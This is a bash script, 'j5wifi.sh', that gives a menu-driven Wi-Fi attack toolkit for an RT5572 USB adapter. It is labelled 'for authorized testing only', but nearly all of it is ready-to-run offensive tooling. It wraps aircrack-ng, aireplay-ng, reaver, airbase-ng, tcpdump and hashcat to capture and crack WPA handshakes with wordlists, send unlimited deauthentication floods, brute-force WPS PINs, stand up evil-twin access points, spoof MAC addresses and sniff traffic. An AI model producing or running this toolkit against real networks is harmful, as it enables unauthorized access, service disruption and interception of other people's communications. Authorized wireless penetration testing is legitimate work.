#!/usr/bin/env bash
# j5wifi.sh — Final J5 Wi-Fi Toolset with Help/Hints
# For authorized testing only.
# Assumes: J5 adapter = wlan0 (Ralink RT5572). Internal Wi-Fi = wlan1 (untouched).

# ---------- CONFIG ----------
J5_IF="wlan0"
MON_IF=""
CHIPSET="rt5572"

# ensure tput won't fail in minimal shells
export TERM=${TERM:-xterm-256color}

# ---------- COLORS ----------
RED=$(tput setaf 1 2>/dev/null || echo "")
GREEN=$(tput setaf 2 2>/dev/null || echo "")
YELLOW=$(tput setaf 3 2>/dev/null || echo "")
CYAN=$(tput setaf 6 2>/dev/null || echo "")
RESET=$(tput sgr0 2>/dev/null || echo "")

pause() { read -rp "Press Enter to continue..."; }

# ---------- REQUIREMENTS CHECK ----------
check_requirements() {
    local reqs=(aircrack-ng macchanger hashcat reaver bully airodump-ng aireplay-ng tcpdump xterm iw git dkms build-essential)
    local missing=()
    for pkg in "${reqs[@]}"; do
        if ! command -v "$pkg" >/dev/null 2>&1; then
            missing+=("$pkg")
        fi
    done

    if (( ${#missing[@]} )); then
        echo -e "${YELLOW}[!] The following required tools are missing:${RESET}"
        for m in "${missing[@]}"; do
            echo -e "   - $m"
        done
        read -rp "Install missing packages now? (y/N): " INSTALL
        if [[ "$INSTALL" =~ ^[Yy]$ ]]; then
            sudo apt update
            sudo apt install -y "${missing[@]}"
        else
            echo -e "${RED}Some tools may not work until installed.${RESET}"
            pause
        fi
    else
        echo -e "${GREEN}[+] All required tools detected.${RESET}"
    fi
}

check_requirements

# ---------- HELP TEXT (Hints) ----------
show_hints() {
  clear
  cat <<HINTS
${CYAN}J5 Wi-Fi Toolset — Hints & Usage${RESET}

General:
 - This tool uses ONLY the J5 adapter: ${YELLOW}$J5_IF${RESET}
 - Your internal Wi-Fi (wlan1) will NOT be modified.
 - If a command requires root you will be prompted.
 - Long-running jobs open an xterm window. Install xterm if missing: sudo apt install -y xterm

Menu quick hints:
 1) Test packet injection
 2) Scan Wi-Fi networks
 3) Automatic handshake capture
 4) Background handshake cracking
 5) Deauthentication attack
 6) Change MAC address (J5 only)
 7) WPS PIN attack
 8) Rogue AP / Evil Twin
 9) Packet sniffing
10) Network mapping / client discovery
11) Hidden SSID discovery
12) Channel hopping
13) Signal strength mapping
14) Handshake verification
15) WPA2-Enterprise / EAP testing
16) Advanced handshake cracking (hashcat)
17) Log / Report generation
18) Update toolset
19) Set regulatory domain
20) Restore J5 to managed mode
21) Install drivers (RT5572)

Other tips:
 - If monitor mode fails, check for wpa_supplicant processes and kill only the one tied to wlan0.
 - To revert quickly:
     sudo ip link set wlan0 down
     sudo iw dev wlan0 set type managed
     sudo ip link set wlan0 up

Press Enter to return to the menu...
HINTS
  read -rn1 -s
}

# ---------- Terminal selection (force xterm) ----------
_choose_term() {
  if command -v xterm >/dev/null 2>&1; then
    echo "xterm"
    return
  fi
  for t in gnome-terminal xfce4-terminal konsole mate-terminal x-terminal-emulator lxterminal; do
    if command -v "$t" >/dev/null 2>&1; then
      echo "$t"
      return
    fi
  done
  echo ""
}

_open_term() {
  local cmd="$1"
  local TERMAPP
  TERMAPP=$(_choose_term)
  if [[ -n "$TERMAPP" ]]; then
    if [[ "$TERMAPP" == "xterm" ]]; then
      xterm -hold -e bash -lc "$cmd" &
    else
      "$TERMAPP" -- bash -lc "$cmd" &
    fi
  else
    bash -lc "$cmd" &
  fi
}

# ---------- J5 interface helpers ----------
check_j5_exists() {
  if ! ip link show "$J5_IF" >/dev/null 2>&1; then
    echo -e "${RED}[!] J5 adapter ($J5_IF) not detected.${RESET}"
    return 1
  fi
  return 0
}

bring_j5_up() {
  sudo ip link set "$J5_IF" down 2>/dev/null || true
  sudo ip link set "$J5_IF" up
  sleep 0.2
}

set_monitor_inplace() {
  if ip link show "${J5_IF}mon" >/dev/null 2>&1; then
    MON_IF="${J5_IF}mon"
    return 0
  fi
  if iw dev "$J5_IF" info 2>/dev/null | grep -q "type monitor"; then
    MON_IF="$J5_IF"
    return 0
  fi
  sudo ip link set "$J5_IF" down
  if ! sudo iw dev "$J5_IF" set type monitor 2>/dev/null; then
    echo -e "${YELLOW}[!] Failed to set $J5_IF to monitor.${RESET}"
    return 1
  fi
  sudo ip link set "$J5_IF" up
  MON_IF="$J5_IF"
  return 0
}

detect_or_create_monitor() {
  check_j5_exists || return 1
  bring_j5_up
  set_monitor_inplace && echo -e "${GREEN}[+] Monitor ready: $MON_IF${RESET}" || { echo -e "${RED}[!] Unable to enable monitor mode.${RESET}"; return 1; }
}

ensure_monitor() {
  if [[ -n "$MON_IF" ]] && ip link show "$MON_IF" >/dev/null 2>&1; then
    return 0
  fi
  detect_or_create_monitor || { pause; return 1; }
}

# ---------- Tools ----------
test_injection() { ensure_monitor || return; sudo aireplay-ng --test "$MON_IF"; pause; }
scan_networks() { ensure_monitor || return; _open_term "sudo airodump-ng $MON_IF; echo; read -rp 'airodump-ng stopped. Press Enter...'"; }
auto_capture() { ensure_monitor || return; read -rp "Target BSSID: " B; read -rp "Channel: " C; read -rp "Output prefix (hand): " O; O=${O:-hand}; _open_term "sudo airodump-ng --bssid $B --channel $C --write $O $MON_IF; echo; read -rp 'Capture stopped. Press Enter...'"; }
bg_crack() { read -rp "Handshake file: " CAP; read -rp "Wordlist: " WL; [[ -f "$CAP" ]] || { echo -e "${RED}File not found${RESET}"; pause; return; }; [[ -f "$WL" ]] || { echo -e "${RED}Wordlist not found${RESET}"; pause; return; }; nohup aircrack-ng "$CAP" -w "$WL" >aircrack_bg.log 2>&1 & echo -e "${GREEN}aircrack-ng running in bg -> aircrack_bg.log${RESET}"; pause; }
deauth_attack() { ensure_monitor || return; read -rp "Target BSSID: " B; read -rp "Client MAC (or 'all'): " C; C_ARG=""; [[ "$C" != "all" && -n "$C" ]] && C_ARG="-c $C"; _open_term "sudo aireplay-ng --deauth 0 -a $B $C_ARG $MON_IF; echo; read -rp 'Deauth stopped. Press Enter...'"; }
mac_change() { read -rp "New MAC or 'random': " M; sudo ip link set "$J5_IF" down; if [[ "$M" == "random" ]]; then RANDMAC=$(hexdump -n6 -e'/1 ":%02X"' /dev/urandom | sed 's/^://'); sudo ip link set dev "$J5_IF" address "$RANDMAC"; echo -e "${GREEN}Set MAC to $RANDMAC${RESET}"; else sudo ip link set dev "$J5_IF" address "$M"; echo -e "${GREEN}Set MAC to $M${RESET}"; fi; sudo ip link set "$J5_IF" up; pause; }
wps_pin() { ensure_monitor || return; read -rp "Target BSSID: " B; _open_term "sudo reaver -i $MON_IF -b $B -vv; echo; read -rp 'Stopped. Press Enter...'"; }
evil_twin() { ensure_monitor || return; read -rp "SSID to clone: " S; read -rp "Channel: " CH; _open_term "sudo airbase-ng -e '$S' -c $CH $MON_IF; echo; read -rp 'Stopped. Press Enter...'"; }
sniff_packets() { ensure_monitor || return; read -rp "Capture file (leave empty to stream): " CAP; [[ -n "$CAP" ]] && _open_term "sudo tcpdump -i $MON_IF -w '$CAP'; echo; read -rp 'Finished. Press Enter...'" || _open_term "sudo tcpdump -i $MON_IF -n -vv; echo; read -rp 'Finished. Press Enter...'"; }
map_clients() { ensure_monitor || return; read -rp "Target BSSID: " B; read -rp "Channel: " CH; _open_term "sudo airodump-ng --bssid $B --channel $CH --write map_$B $MON_IF; echo; read -rp 'Done. Press Enter...'"; }
hidden_ssid() { ensure_monitor || return; _open_term "sudo airodump-ng $MON_IF; echo; read -rp 'Done. Press Enter...'"; }
channel_hop() { ensure_monitor || return; _open_term "sudo airodump-ng --channel 1-13 $MON_IF; echo; read -rp 'Done. Press Enter...'"; }
signal_map() { ensure_monitor || return; read -rp "Target BSSID: " B; read -rp "Channel: " CH; _open_term "sudo airodump-ng --bssid $B --channel $CH $MON_IF; echo; read -rp 'Done. Press Enter...'"; }
verify_handshake() { read -rp "Handshake file (cap/hc22000): " F; [[ -f "$F" ]] || { echo -e "${RED}File not found${RESET}"; pause; return; }; aircrack-ng "$F"; pause; }
eap_test() { echo -e "${YELLOW}WPA2-Enterprise testing requires extra tools.${RESET}"; pause; }
hashcat_advanced() { read -rp "Path to .hc22000/.hccapx/.cap: " F; read -rp "Wordlist path: " WL; _open_term "hashcat -m 22000 '$F' '$WL'; echo; read -rp 'Done. Press Enter...'"; }
generate_report() { OUT="j5_report_$(date +%Y%m%d_%H%M%S).txt"; { echo "J5 Wi-Fi Toolset Report - $(date)"; ip a; iwconfig 2>/dev/null; } > "$OUT"; echo -e "${GREEN}Saved report to $OUT${RESET}"; pause; }
update_toolset() { [[ -d "$HOME/j5wifi/.git" ]] && git -C "$HOME/j5wifi" pull || echo -e "${YELLOW}No git repo.${RESET}"; pause; }
set_regdom() { read -rp "Country code (e.g. US): " CC; sudo iw reg set "$CC"; echo -e "${GREEN}Reg domain set to $CC${RESET}"; pause; }
restore_j5() { sudo ip link set "$J5_IF" down || true; sudo iw dev "$J5_IF" set type managed 2>/dev/null || true; sudo ip link set "$J5_IF" up; echo -e "${GREEN}J5 restored to managed mode.${RESET}"; pause; }
install_drivers() { sudo apt update; sudo apt install -y build-essential dkms git linux-headers-$(uname -r); echo -e "${GREEN}Ensure RT5572 driver present (rt2800usb).${RESET}"; pause; }

# ---------- MENU ----------
menu() {
  while true; do
    clear
    echo -e "${CYAN}J5 Wi-Fi Toolset (J5=${J5_IF}, chipset=${CHIPSET})${RESET}"
    echo
    printf "  %s\n" " 1) Test packet injection"
    printf "  %s\n" " 2) Scan Wi-Fi networks"
    printf "  %s\n" " 3) Automatic handshake capture"
    printf "  %s\n" " 4) Background handshake cracking"
    printf "  %s\n" " 5) Deauthentication attack"
    printf "  %s\n" " 6) Change MAC address"
    printf "  %s\n" " 7) WPS PIN attack"
    printf "  %s\n" " 8) Rogue AP / Evil Twin"
    printf "  %s\n" " 9) Packet sniffing"
    printf "  %s\n" "10) Network mapping / client discovery"
    printf "  %s\n" "11) Hidden SSID discovery"
    printf "  %s\n" "12) Channel hopping"
    printf "  %s\n" "13) Signal strength mapping"
    printf "  %s\n" "14) Handshake verification"
    printf "  %s\n" "15) WPA2-Enterprise / EAP testing"
    printf "  %s\n" "16) Advanced handshake cracking (hashcat)"
    printf "  %s\n" "17) Log / Report generation"
    printf "  %s\n" "18) Update toolset"
    printf "  %s\n" "19) Set regulatory domain"
    printf "  %s\n" "20) Restore J5 to managed mode"
    printf "  %s\n" "21) Install drivers (RT5572)"
    printf "  %s\n" " 0) Exit (restores J5)"
    printf "\n  %s\n" " h) Hints & quick help"
    echo
    read -rp "Select: " CH
    case "$CH" in
      1) test_injection ;;
      2) scan_networks ;;
      3) auto_capture ;;
      4) bg_crack ;;
      5) deauth_attack ;;
      6) mac_change ;;
      7) wps_pin ;;
      8) evil_twin ;;
      9) sniff_packets ;;
      10) map_clients ;;
      11) hidden_ssid ;;
      12) channel_hop ;;
      13) signal_map ;;
      14) verify_handshake ;;
      15) eap_test ;;
      16) hashcat_advanced ;;
      17) generate_report ;;
      18) update_toolset ;;
      19) set_regdom ;;
      20) restore_j5 ;;
      21) install_drivers ;;
      0) restore_j5; echo "Bye."; exit 0 ;;
      h|H) show_hints ;;
      *) echo -e "${YELLOW}Invalid option${RESET}"; sleep 1 ;;
    esac
  done
}

# ---------- ENTRYPOINT ----------
menu
